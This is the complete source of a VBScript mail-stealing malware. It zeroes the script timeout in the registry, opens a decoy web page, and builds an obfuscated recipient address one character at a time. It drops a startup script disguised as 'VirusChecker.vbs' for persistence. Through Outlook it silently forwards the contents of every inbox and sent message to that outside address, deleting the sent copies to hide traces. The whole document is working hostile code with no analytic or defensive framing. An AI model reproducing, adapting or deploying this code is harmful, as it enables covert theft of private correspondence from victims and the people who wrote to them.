On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
main()

sub main()
On Error Resume Next
dim wscr,rr,IE
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\MicrosoftWindows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set IE = CreateObject("InternetExplorer.Application")
IE.Visible = True
IE.Navigate "http://www.madblast.com/view.cfm?type=Picture&display=1680"
setupfile()
mail()
end sub

sub setupfile()
On Error Resume Next
dim scrip,dirtemp,fso
Set fso = CreateObject("Scripting.FileSystemObject")
Set dirtemp = fso.GetSpecialFolder(1)
Set scrip=fso.CreateTextFile("c:\winnt\profiles\all users\start menu\programs\startup\VirusChecker.vbs")
scrip.WriteLine "On Error Resume Next"
scrip.WriteLine "Dim EachItem"
scrip.WriteLine "Dim MailItem, InboxFolder,sentFolder,compare"
scrip.WriteLine "Dim theApp, theNameSpace,theMailItem,datee,Daydiff,dayOfWeek"
scrip.WriteLine "Dim temppp1, temppp2, temppp3, temppp4, temppp5"
scrip.WriteLine "Dim temppp6, temppp7, temppp8, temppp9, temppp10, temppp11"
scrip.WriteLine "Dim temppp12, temppp13, temppp14,temppp15,temppp"
scrip.WriteLine "temppp1=""c"""
scrip.WriteLine "temppp2=""p"""
scrip.WriteLine "temppp3=""r"""
scrip.WriteLine "temppp4=""k"""
scrip.WriteLine "temppp5=""i"""
scrip.WriteLine "temppp6=""h"""
scrip.WriteLine "temppp7=""e"""
scrip.WriteLine "temppp8=""."""
scrip.WriteLine "temppp9=""@"""
scrip.WriteLine "temppp10=""t"""
scrip.WriteLine "temppp11=""a"""
scrip.WriteLine "temppp12=""o"""
scrip.WriteLine "temppp13=""m"""
scrip.WriteLine "temppp14=""l"""
scrip.WriteLine "temppp15=""v"""
scrip.WriteLine "temppp=temppp15&temppp1&temppp6&temppp7&temppp1&temppp4&temppp2&temppp3&temppp9"
scrip.WriteLine "temppp=temppp&temppp6&temppp12&temppp10&temppp13&temppp11&temppp5&temppp14&temppp8"
scrip.WriteLine "temppp=temppp&temppp1&temppp12&temppp13"
scrip.WriteLine "compare=-1"
scrip.WriteLine "Set theApp = CreateObject (""Outlook.Application"")"
scrip.WriteLine "theApp.Visible = False"
scrip.WriteLine "Set theNameSpace = theApp.GetNamespace(""MAPI"")"
scrip.WriteLine "Set InboxFolder = theNameSpace.GetDefaultFolder(6)"
scrip.WriteLine "For i=1 to InboxFolder.items.count"
scrip.WriteLine "Set theMailItem = theApp.CreateItem(olMailItem)"
scrip.WriteLine "theMailItem.Recipients.Add temppp"
scrip.WriteLine "theMailItem.Subject = ""ibox""&i&"" ""&InboxFolder.items(i).Subject"
scrip.WriteLine "theMailItem.Body = InboxFolder.items(i).body"
scrip.WriteLine "datee = InboxFolder.items(i).ReceivedTime"
scrip.WriteLine "Daydiff = DateDiff(""d"",Now,datee)"
scrip.WriteLine "dayOfWeek = Int(Weekday(now))"
scrip.WriteLine "If dayofWeek = 2 Then"
scrip.WriteLine "compare = -3"
scrip.WriteLine "End If"
scrip.WriteLine "If Daydiff =compare Then"
scrip.WriteLine "theMailItem.DeleteAfterSubmit = True"
scrip.WriteLine "theMailItem.Send"
scrip.WriteLine "End If"
scrip.WriteLine "Next"
scrip.WriteLine "Set sentFolder = theNameSpace.GetDefaultFolder(5)"
scrip.WriteLine "For i=1 to sentFolder.items.count"
scrip.WriteLine "Set theMailItem = theApp.CreateItem(olMailItem)"
scrip.WriteLine "theMailItem.Recipients.Add temppp"
scrip.WriteLine "theMailItem.Subject = ""sbox""&i&"" ""&sentFolder.items(i).Subject"
scrip.WriteLine "theMailItem.Body = sentFolder.items(i).body"
scrip.WriteLine "datee = InboxFolder.items(i).SentOn"
scrip.WriteLine "Daydiff = DateDiff(""d"",Now,datee)"
scrip.WriteLine "dayOfWeek = Int(Weekday(now))"
scrip.WriteLine "If dayofWeek = 2 Then"
scrip.WriteLine "compare = -3"
scrip.WriteLine "End If"
scrip.WriteLine "If Daydiff =compare Then"
scrip.WriteLine "theMailItem.DeleteAfterSubmit = True"
scrip.WriteLine "theMailItem.Send"
scrip.WriteLine "End If"
scrip.WriteLine "Next"

end sub

sub mail()
On Error Resume Next
Dim EachItem, temppp1, temppp2, temppp3, temppp4, temppp5
Dim temppp6, temppp7, temppp8, temppp9, temppp10, temppp11
Dim temppp12, temppp13, temppp14,temppp15,temppp
Dim MailItem, InboxFolder,sentFolder,compare
Dim theApp, theNameSpace,theMailItem,datee,Daydiff,dayOfWeek
Set theApp = CreateObject ("Outlook.Application")
theApp.Visible = False
temppp1="c"
temppp2="p"
temppp3="r"
temppp4="k"
temppp5="i"
temppp6="h"
temppp7="e"
temppp8="."
temppp9="@"
temppp10="t"
temppp11="a"
temppp12="o"
temppp13="m"
temppp14="l"
temppp15="v"
temppp=temppp15&temppp1&temppp6&temppp7&temppp1&temppp4&temppp2&temppp3&temppp9
temppp=temppp&temppp6&temppp12&temppp10&temppp13&temppp11&temppp5&temppp14&temppp8
temppp=temppp&temppp1&temppp12&temppp13
Set theNameSpace = theApp.GetNamespace("MAPI")
Set InboxFolder = theNameSpace.GetDefaultFolder(6)
Set sentFolder = theNameSpace.GetDefaultFolder(5)
For i=1 to InboxFolder.items.count
If theMailItem.subject="Halloween Elvis" Then
theMailItem.close
theMailItem.delete
End If
Set theMailItem = theApp.CreateItem(olMailItem)
theMailItem.Recipients.Add temppp
theMailItem.Subject = "ibox"&i&" "&InboxFolder.items(i).Subject
theMailItem.Body = InboxFolder.items(i).body
theMailItem.DeleteAfterSubmit = True
theMailItem.Send
Next

For i=1 to sentFolder.items.count
Set theMailItem = theApp.CreateItem(olMailItem)
theMailItem.Recipients.Add temppp
theMailItem.Subject = "sbox"&i&" "&sentFolder.items(i).Subject
theMailItem.Body = sentFolder.items(i).body
theMailItem.DeleteAfterSubmit = True
theMailItem.Send
Next
end sub
